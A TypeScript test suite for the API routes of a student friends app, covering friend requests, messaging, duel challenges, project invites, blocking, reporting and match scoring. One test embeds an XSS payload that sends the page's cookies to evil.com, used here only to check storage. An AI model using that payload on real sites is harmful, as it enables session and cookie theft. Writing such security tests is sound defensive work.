import assert from 'assert';
import fs from 'fs';
import path from 'path';

import { GET as getFriends, POST as postFriend, PATCH as patchFriend, DELETE as deleteFriend } from '../src/app/api/friends/route';
import { GET as getMessages, POST as postMessage, PATCH as patchMessage } from '../src/app/api/friends/messages/route';
import { GET as getChallenges, POST as postChallenge, PATCH as patchChallenge } from '../src/app/api/friends/challenges/route';
import { GET as getProjects, POST as postProject, PATCH as patchProject } from '../src/app/api/friends/projects/route';
import { GET as getPrivacy, PUT as putPrivacy, POST as postPrivacy } from '../src/app/api/friends/privacy/route';
import { POST as postReport } from '../src/app/api/friends/report/route';
import { GET as getSuggestions } from '../src/app/api/friends/suggestions/route';
import { computeStudentMatch, CURRENT_STUDENT_PROFILE, rankAndFilterStudents, MatchStudentProfile } from '../src/lib/friends/matching';

const DB_PATH = path.join(process.cwd(), 'src', 'lib', 'data', 'friends_db.json');

// Backup DB state before running tests
let originalDb = '{}';
if (fs.existsSync(DB_PATH)) {
  originalDb = fs.readFileSync(DB_PATH, 'utf8');
}

function restoreDb() {
  fs.writeFileSync(DB_PATH, originalDb, 'utf8');
}

let passed = 0;
let failed = 0;

async function test(name: string, fn: () => Promise<void>) {
  try {
    await fn();
    console.log(`  ✅ PASS: ${name}`);
    passed++;
  } catch (err: any) {
    console.error(`  ❌ FAIL: ${name}`);
    console.error(`     Reason: ${err.message}`);
    failed++;
  }
}

async function run() {
  console.log('\n================================================================');
  console.log('⚡ BRUTAL REAL-WORLD ADVERSARIAL SYSTEM TEST: PIN-IT FRIENDS OS');
  console.log('================================================================\n');

  try {
    // ── SUITE 1: End-to-End Multi-Student University Day Simulation ──────────
    console.log('--- Suite 1: End-to-End Multi-Student University Day Simulation ---');

    const priyaId = `student_priya_${Date.now()}`;
    let friendReqId = '';
    let challengeDuelId = '';
    let squadProjInvId = '';

    await test('1. Vinay browses Smart Affinity suggestions and receives ranked peers', async () => {
      const req = new Request('http://localhost:3000/api/friends/suggestions?filter=all');
      const res = await getSuggestions(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert(Array.isArray(data.suggestions));
      assert(data.suggestions.length > 0);
      for (let i = 0; i < data.suggestions.length - 1; i++) {
        assert(data.suggestions[i].match.overallMatch >= data.suggestions[i + 1].match.overallMatch);
      }
    });

    await test('2. Vinay dispatches a friend request to Priya Sharma', async () => {
      const req = new Request('http://localhost:3000/api/friends', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetStudentId: priyaId })
      });
      const res = await postFriend(req);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert(data.friendship);
      assert.strictEqual(data.friendship.status, 'pending');
      friendReqId = data.friendship.id;
    });

    await test('3. Priya Sharma accepts Vinay\'s friend request via PATCH', async () => {
      const req = new Request('http://localhost:3000/api/friends', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestId: friendReqId, action: 'accept' })
      });
      const res = await patchFriend(req);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert.strictEqual(data.friendship.status, 'accepted');
    });

    await test('4. Vinay\'s friend list now includes Priya Sharma as an accepted friend', async () => {
      const req = new Request('http://localhost:3000/api/friends');
      const res = await getFriends(req);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      const hasPriya = data.friends.some((f: any) => f.student?.id === priyaId);
      assert.strictEqual(hasPriya, true);
    });

    await test('5. Vinay sends a Direct Message to Priya Sharma discussing the hackathon', async () => {
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          receiverId: priyaId,
          message: 'Hey Priya! Loved your UI work. Want to lead Design for our Campus Transit squad?'
        })
      });
      const res = await postMessage(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert.strictEqual(data.message.is_read, false);
    });

    await test('6. Priya marks Vinay\'s messages as read via PATCH', async () => {
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ friendId: priyaId })
      });
      const res = await patchMessage(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
    });

    await test('7. Vinay dispatches a Squad Project Invite to Priya Sharma', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          studentId: priyaId,
          studentName: 'Priya Sharma',
          projectName: 'Campus Transit Telemetry Desk',
          role: 'UI/UX Lead',
          commitmentHours: 8,
          message: 'Join our squad as UI/UX Lead!'
        })
      });
      const res = await postProject(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert(data.invitation);
      squadProjInvId = data.invitation.id;
    });

    await test('8. Priya accepts the Squad Project invitation', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          inviteId: squadProjInvId,
          action: 'accept'
        })
      });
      const res = await patchProject(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert.strictEqual(data.invitation.status, 'accepted');
    });

    await test('9. Rahul Shetty challenges Vinay to a 1v1 Arena Duel', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          studentId: 'rahul_shetty',
          studentName: 'Rahul Shetty',
          topic: 'Distributed Systems & Concurrency',
          difficulty: 'Hard',
          timeLimit: 30,
          wagerXP: 250,
          message: 'Let us duel on Distributed Systems!'
        })
      });
      const res = await postChallenge(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert(data.challenge);
      challengeDuelId = data.challenge.id;
    });

    await test('10. Vinay accepts the Arena Duel and receives battle URL', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          challengeId: challengeDuelId,
          action: 'accept'
        })
      });
      const res = await patchChallenge(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert.strictEqual(data.challenge.status, 'accepted');
      assert(data.battleUrl.includes('/arena'));
    });

    // ── SUITE 2: Mutual Auto-Resolution & Concurrency Hardening ──────────────
    console.log('\n--- Suite 2: Mutual Auto-Resolution & Concurrency Hardening ---');

    await test('11. Mutual friend request auto-resolves to accepted friendship', async () => {
      const bobId = `student_bob_${Date.now()}`;
      const db = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
      if (!db.friendships) db.friendships = [];
      db.friendships.push({
        id: `f-${bobId}-to-vinay`,
        requester_id: bobId,
        addressee_id: 'current_user',
        status: 'pending',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString()
      });
      fs.writeFileSync(DB_PATH, JSON.stringify(db, null, 2), 'utf8');

      const req = new Request('http://localhost:3000/api/friends', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetStudentId: bobId })
      });
      const res = await postFriend(req);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert.strictEqual(data.status, 'accepted');
      assert(data.message.includes('Mutual request accepted'));
    });

    await test('12. Replay attack: Double-accepting an already accepted friend request fails with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ requestId: friendReqId, action: 'accept' })
      });
      const res = await patchFriend(req);
      const data = await res.json();
      assert.strictEqual(res.status, 400);
      assert.strictEqual(data.ok, false);
      assert(data.error.includes('already been accepted'));
    });

    await test('13. Replay attack: Double-accepting an already accepted arena challenge fails with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ challengeId: challengeDuelId, action: 'accept' })
      });
      const res = await patchChallenge(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 400);
      assert.strictEqual(data.ok, false);
      assert(data.error.includes('already been accepted'));
    });

    await test('14. Replay attack: Double-accepting an already accepted squad project invite fails with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'PATCH',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ inviteId: squadProjInvId, action: 'accept' })
      });
      const res = await patchProject(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 400);
      assert.strictEqual(data.ok, false);
      assert(data.error.includes('already been accepted'));
    });

    await test('15. Rapid message burst: 10 messages dispatches sequentially with order preserved', async () => {
      for (let i = 1; i <= 10; i++) {
        const req = new Request('http://localhost:3000/api/friends/messages', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            receiverId: priyaId,
            message: `Burst message packet #${i}`
          })
        });
        const res = await postMessage(req as any);
        const data = await res.json();
        assert.strictEqual(res.status, 200);
        assert.strictEqual(data.ok, true);
        assert.strictEqual(data.message.message, `Burst message packet #${i}`);
      }
    });

    // ── SUITE 3: Malice, Boundary Invariants & Fuzzing ─────────────────────────
    console.log('\n--- Suite 3: Malice, Boundary Invariants & Fuzzing ---');

    await test('16. Self friend request rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetStudentId: 'current_user' })
      });
      const res = await postFriend(req);
      assert.strictEqual(res.status, 400);
    });

    await test('17. Self messaging rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: 'current_user', message: 'Talking to myself' })
      });
      const res = await postMessage(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('18. Self duel challenge rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'current_user', topic: 'Algorithm Duels' })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('19. Self project invite rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'current_user', projectName: 'Solo Venture' })
      });
      const res = await postProject(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('20. Self blocking rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/privacy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'block', studentId: 'current_user' })
      });
      const res = await postPrivacy(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('21. Self reporting rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ reportedStudentId: 'current_user', reason: 'Self doubt' })
      });
      const res = await postReport(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('22. Message boundary: empty string rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: priyaId, message: '' })
      });
      const res = await postMessage(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('23. Message boundary: whitespace-only string rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: priyaId, message: '   \n  \t  ' })
      });
      const res = await postMessage(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('24. Message boundary: 2000 chars (exact limit) accepted with 200', async () => {
      const maxMsg = 'A'.repeat(2000);
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: priyaId, message: maxMsg })
      });
      const res = await postMessage(req as any);
      assert.strictEqual(res.status, 200);
    });

    await test('25. Message boundary: 2001 chars (over limit) rejected with 400', async () => {
      const overflowMsg = 'A'.repeat(2001);
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: priyaId, message: overflowMsg })
      });
      const res = await postMessage(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('26. Wager XP boundary: negative XP (-50 XP) rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', wagerXP: -50 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('27. Wager XP boundary: 0 XP (min bound) accepted with 200', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', wagerXP: 0 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 200);
    });

    await test('28. Wager XP boundary: 1000 XP (max bound) accepted with 200', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', wagerXP: 1000 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 200);
    });

    await test('29. Wager XP boundary: 1001 XP (over limit) rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', wagerXP: 1001 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('30. Time limit boundary: 4 mins (below 5 mins limit) rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', timeLimit: 4 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('31. Time limit boundary: 120 mins (max bound) accepted with 200', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', timeLimit: 120 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 200);
    });

    await test('32. Time limit boundary: 121 mins (over limit) rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', topic: 'Algorithms', timeLimit: 121 })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('33. Project commitment hours: 0 hrs (below 1 hr limit) rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', projectName: 'AI Labs', commitmentHours: 0 })
      });
      const res = await postProject(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('34. Project commitment hours: 60 hrs (max bound) accepted with 200', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', projectName: 'AI Labs', commitmentHours: 60 })
      });
      const res = await postProject(req as any);
      assert.strictEqual(res.status, 200);
    });

    await test('35. Project commitment hours: 61 hrs (over limit) rejected with 400', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'rahul_shetty', projectName: 'AI Labs', commitmentHours: 61 })
      });
      const res = await postProject(req as any);
      assert.strictEqual(res.status, 400);
    });

    await test('36. XSS attack injection payload safely stored as verbatim string', async () => {
      const xss = '<script>document.location="http://evil.com/steal?c="+document.cookie</script>';
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: priyaId, message: xss })
      });
      const res = await postMessage(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.message.message, xss);
    });

    await test('37. Unicode, Emoji and Multiline payload stored without corruption', async () => {
      const richMsg = '🚀 Rocket Launch!\nLine 2: 💻 Code snippet: `const x = 42;`\nLine 3: 🌟 100% Win Rate';
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: priyaId, message: richMsg })
      });
      const res = await postMessage(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.message.message, richMsg);
    });

    // ── SUITE 4: Safety Perimeter, Stalker & Blocklist Defense ────────────────
    console.log('\n--- Suite 4: Safety Perimeter, Stalker & Blocklist Defense ---');

    await test('38. User blocks an abusive troll student ("toxic_spammer")', async () => {
      const req = new Request('http://localhost:3000/api/friends/privacy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'block', studentId: 'toxic_spammer', studentName: 'Toxic Spammer' })
      });
      const res = await postPrivacy(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
    });

    await test('39. Blocked student attempting friend connection is rejected with 403', async () => {
      const req = new Request('http://localhost:3000/api/friends', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetStudentId: 'toxic_spammer' })
      });
      const res = await postFriend(req);
      assert.strictEqual(res.status, 403);
    });

    await test('40. Blocked student attempting direct messaging is rejected with 403', async () => {
      const req = new Request('http://localhost:3000/api/friends/messages', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ receiverId: 'toxic_spammer', message: 'Should be blocked' })
      });
      const res = await postMessage(req as any);
      assert.strictEqual(res.status, 403);
    });

    await test('41. Blocked student attempting duel challenge is rejected with 403', async () => {
      const req = new Request('http://localhost:3000/api/friends/challenges', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'toxic_spammer', topic: 'React Duel' })
      });
      const res = await postChallenge(req as any);
      assert.strictEqual(res.status, 403);
    });

    await test('42. Blocked student attempting squad project invite is rejected with 403', async () => {
      const req = new Request('http://localhost:3000/api/friends/projects', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ studentId: 'toxic_spammer', projectName: 'Hacked Project' })
      });
      const res = await postProject(req as any);
      assert.strictEqual(res.status, 403);
    });

    await test('43. Blocked student is completely filtered out of Smart Affinity suggestions', async () => {
      const req = new Request('http://localhost:3000/api/friends/suggestions?filter=all');
      const res = await getSuggestions(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      const isToxicPresent = data.suggestions.some((s: any) => (s.student?.id || s.id) === 'toxic_spammer');
      assert.strictEqual(isToxicPresent, false);
    });

    await test('44. Submitting Trust & Safety moderation report succeeds with pending_review audit', async () => {
      const req = new Request('http://localhost:3000/api/friends/report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          reportedStudentId: 'toxic_spammer',
          reportedStudentName: 'Toxic Spammer',
          reason: 'Harassment & Spamming Duels',
          details: 'User repeatedly spammed obscene messages and sent negative wager requests.'
        })
      });
      const res = await postReport(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);
      assert.strictEqual(data.report.status, 'pending_review');
      assert(data.report.id.startsWith('report-'));
    });

    await test('45. Unblocking student restores normal interaction capabilities', async () => {
      const req = new Request('http://localhost:3000/api/friends/privacy', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ action: 'unblock', studentId: 'toxic_spammer', studentName: 'Toxic Spammer' })
      });
      const res = await postPrivacy(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert.strictEqual(data.ok, true);

      // Now connection attempt should not be 403
      const connectReq = new Request('http://localhost:3000/api/friends', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ targetStudentId: 'toxic_spammer' })
      });
      const connectRes = await postFriend(connectReq);
      assert.strictEqual(connectRes.status, 200);
    });

    // ── SUITE 5: Smart Affinity Matching Mathematical Invariants ──────────────
    console.log('\n--- Suite 5: Smart Affinity Matching Mathematical Invariants ---');

    await test('46. Cold-start student with 0 skills produces valid score without NaN', async () => {
      const blankStudent: MatchStudentProfile = {
        id: 'freshman_blank',
        name: 'Freshman Blank',
        headline: '',
        avatar: '',
        college: 'Other College',
        course: 'BA',
        careerGoal: '',
        skills: []
      };
      const result = computeStudentMatch(CURRENT_STUDENT_PROFILE, blankStudent);
      assert(!isNaN(result.overallMatch));
      assert(result.overallMatch >= 50 && result.overallMatch <= 100);
      assert(typeof result.reasonTag === 'string');
    });

    await test('47. Identical twin skill set produces >= 90% affinity match score', async () => {
      const twinStudent: MatchStudentProfile = {
        id: 'twin_vinay',
        name: 'Twin Student',
        headline: CURRENT_STUDENT_PROFILE.headline,
        avatar: '',
        college: CURRENT_STUDENT_PROFILE.college,
        course: CURRENT_STUDENT_PROFILE.course,
        careerGoal: CURRENT_STUDENT_PROFILE.careerGoal,
        skills: [...CURRENT_STUDENT_PROFILE.skills]
      };
      const result = computeStudentMatch(CURRENT_STUDENT_PROFILE, twinStudent);
      assert(result.overallMatch >= 90);
      assert(typeof result.reasonTag === 'string');
    });

    await test('48. Filter "skills" returns students with shared or complementary skill profiles', async () => {
      const req = new Request('http://localhost:3000/api/friends/suggestions?filter=skills');
      const res = await getSuggestions(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert(data.suggestions.length > 0);
      data.suggestions.forEach((s: any) => {
        assert(s.match.commonSkills.length > 0 || s.match.complementarySkills.length > 0);
      });
    });

    await test('49. Filter "college" returns students with high college regional proximity (>=85)', async () => {
      const req = new Request('http://localhost:3000/api/friends/suggestions?filter=college');
      const res = await getSuggestions(req as any);
      const data = await res.json();
      assert.strictEqual(res.status, 200);
      assert(data.suggestions.length > 0);
      data.suggestions.forEach((s: any) => {
        assert(s.match.collegeScore >= 85);
      });
    });

    await test('50. Math boundary clamp: score never exceeds 98% or drops below 55%', async () => {
      const testCandidates: MatchStudentProfile[] = [
        { id: 'c1', name: 'C1', skills: ['React', 'Next.js', 'Typescript', 'Node.js', 'Python', 'AI/ML', 'TailwindCSS'], college: 'Bangalore University', course: 'BCA', careerGoal: 'Fullstack' },
        { id: 'c2', name: 'C2', skills: ['Knitting', 'Astronomy', 'History'], college: 'Oxford', course: 'BA', careerGoal: 'Historian' }
      ];
      for (const cand of testCandidates) {
        const res = computeStudentMatch(CURRENT_STUDENT_PROFILE, cand);
        assert(res.overallMatch <= 98, `Score ${res.overallMatch} must not exceed 98%`);
        assert(res.overallMatch >= 55, `Score ${res.overallMatch} must not drop below 55%`);
      }
    });

  } finally {
    // Restore DB state cleanly
    restoreDb();
  }

  console.log('\n================================================================');
  console.log(`📊 BRUTAL REAL-WORLD SYSTEM TEST RESULTS: ${passed} / ${passed + failed} PASSED`);
  if (failed === 0) {
    console.log('🏆 100% BULLETPROOF PASS: EVERY SYSTEM BOUNDARY, CONCURRENCY & ATTACK VECTOR SECURED!');
  } else {
    console.log(`⚠️ ${failed} TEST CASES FAILED! ACTION REQUIRED.`);
    process.exit(1);
  }
  console.log('================================================================\n');
}

run();
